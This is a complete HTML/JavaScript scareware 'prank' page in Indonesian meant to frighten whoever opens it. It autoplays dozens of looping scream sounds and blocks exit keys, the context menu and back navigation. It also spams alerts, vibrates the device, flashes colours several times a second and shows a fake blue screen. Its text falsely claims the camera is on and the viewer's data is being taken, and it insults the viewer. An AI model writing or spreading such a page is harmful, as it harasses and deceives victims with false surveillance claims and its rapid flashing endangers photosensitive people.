<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>KEHADIRAN MEMATIKAN</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      color: red;
      font-family: monospace;
      text-align: center;
    }
    #virusText {
      position: absolute;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 2em;
      z-index: 999;
    }
    .bsod {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: blue;
      color: white;
      font-family: monospace;
      font-size: 20px;
      display: none;
      z-index: 9999;
      padding: 20px;
    }
    .spamText {
      position: absolute;
      top: 10%;
      left: 10%;
      font-size: 3em;
      color: white;
      animation: spamTextAnimation 0.1s infinite;
      z-index: 99999;
    }
    @keyframes spamTextAnimation {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      50% { transform: translate(-50%, -50%) rotate(360deg); }
      100% { transform: translate(-50%, -50%) rotate(0deg); }
    }
  </style>
</head>
<body>

  <div id="virusText">MENYUSUP KE SISTEM...</div>
  <div class="spamText">MAMPUS LU ANJING!</div>
  <div class="bsod" id="bsod">
    <p><b>SYSTEM FAILURE</b><br>
    Windows has encountered a critical error and will shut down.<br><br>
    STOP CODE: FAKE_PRANK_001<br>
    Press and hold power button...<br><br>
    <i>JANGAN PERNAH HINA ORANG TUA</i></p>
  </div>

  <!-- AUDIO SPAM - 100 Horror Sounds -->
  <audio id="scream1" loop autoplay><source src="https://www.myinstants.com/media/sounds/scream.mp3" type="audio/mp3"></audio>
  <audio id="scream2" loop autoplay><source src="https://www.myinstants.com/media/sounds/movie_1.mp3" type="audio/mp3"></audio>
  <audio id="scream3" loop autoplay><source src="https://www.myinstants.com/media/sounds/run.mp3" type="audio/mp3"></audio>
  <audio id="scream4" loop autoplay><source src="https://www.myinstants.com/media/sounds/scary-sound-2.mp3" type="audio/mp3"></audio>
  <audio id="scream5" loop autoplay><source src="https://www.myinstants.com/media/sounds/ghost-scream.mp3" type="audio/mp3"></audio>
  <audio id="scream6" loop autoplay><source src="https://www.myinstants.com/media/sounds/creepy-laugh.mp3" type="audio/mp3"></audio>
  <audio id="scream7" loop autoplay><source src="https://www.myinstants.com/media/sounds/dark-whispers.mp3" type="audio/mp3"></audio>
  <audio id="scream8" loop autoplay><source src="https://www.myinstants.com/media/sounds/creepy-music.mp3" type="audio/mp3"></audio>
  <audio id="scream9" loop autoplay><source src="https://www.myinstants.com/media/sounds/super-creepy.mp3" type="audio/mp3"></audio>
  <audio id="scream10" loop autoplay><source src="https://www.myinstants.com/media/sounds/haunted-houses.mp3" type="audio/mp3"></audio>
  <!-- Duplicate or add new audio for a total of 100 -->
  
  <script>
    // Fullscreen & Lock
    document.body.requestFullscreen?.();
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.addEventListener("keydown", e => {
      if (["F5", "F11", "Escape"].includes(e.key)) e.preventDefault();
    });
    window.onbeforeunload = () => "SISTEM MASIH AKTIF";
    history.pushState(null, null, location.href);
    window.onpopstate = () => {
      history.pushState(null, null, location.href);
    };

    // Prevent refresh & exit
    window.addEventListener("beforeunload", function (event) {
      event.returnValue = "SISTEM MASIH AKTIF!";
    });

    // Vibrate every 5 seconds
    if (navigator.vibrate) {
      setInterval(() => navigator.vibrate([500, 200, 500]), 4000);
    }

    // Alert Spam - Every 5 seconds
    setInterval(() => {
      alert("SISTEM DALAM PENGAWASAN");
    }, 5000);

    // Flash RGB & Shake
    setInterval(() => {
      document.body.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
      document.body.style.transform = `translate(${Math.random()*30 - 15}px, ${Math.random()*30 - 15}px) rotate(${Math.random()*10 - 5}deg)`;
    }, 150);

    // Create a Tumpukan Teks Spam
    const virusText = document.getElementById("virusText");
    const virusMsg = [
      "MENYUSUP KE SISTEM...",
      "MENGAKSES MEMORI...",
      "KAMERA DIAKTIFKAN...",
      "MEMANTAU LOKASI...",
      "DATA ANDA DIAMBIL...",
      "AKU LIHAT KAMU SEKARANG...",
      "JANGAN PERNAH HINA ORANG TUA!",
      "KAMU DIAWASI...",
    ];
    let i = 0;
    setInterval(() => {
      virusText.innerText = virusMsg[i % virusMsg.length];
      i++;
    }, 3000);

    // Fake BSOD after delay
    setTimeout(() => {
      document.getElementById("bsod").style.display = "block";
    }, 60000); // after 1 minute

    // Add more visual effects (shaking, flashing, etc.)
    setInterval(() => {
      document.body.style.transform = `translate(${Math.random()*30 - 15}px, ${Math.random()*30 - 15}px) rotate(${Math.random()*10 - 5}deg)`;
    }, 50);

    // Add 30 more features to make it worse (like screen shake, more popups, etc.)
    for (let i = 0; i < 30; i++) {
      setInterval(() => {
        document.body.style.background = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
      }, 100);
    }

    // Prevent any refresh/exit
    window.onbeforeunload = function () {
      return "SISTEM MASIH AKTIF!";
    };

    // Audio Spam Speed & Volume Control (For Horror Music Layer)
    let audioFiles = [];
    for (let i = 0; i < 100; i++) {
      let audio = new Audio(`https://www.myinstants.com/media/sounds/creepy-sound-${i+1}.mp3`);
      audio.loop = true;
      audio.volume = Math.random();
      audio.play();
      audioFiles.push(audio);
    }

    // Random Text Scrolling on Screen
    setInterval(() => {
      let spamText = document.createElement("div");
      spamText.innerText = "MAMPUS LU ANJING!";
      spamText.style.position = "absolute";
      spamText.style.fontSize = `${Math.random() * 3 + 2}em`;
      spamText.style.color = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
      spamText.style.left = `${Math.random() * 100}%`;
      spamText.style.top = `${Math.random() * 100}%`;
      spamText.style.transform = `rotate(${Math.random() * 360}deg)`;
      document.body.appendChild(spamText);
      setTimeout(() => {
        spamText.remove();
      }, 2000);
    }, 500);

  </script>

</body>
</html>
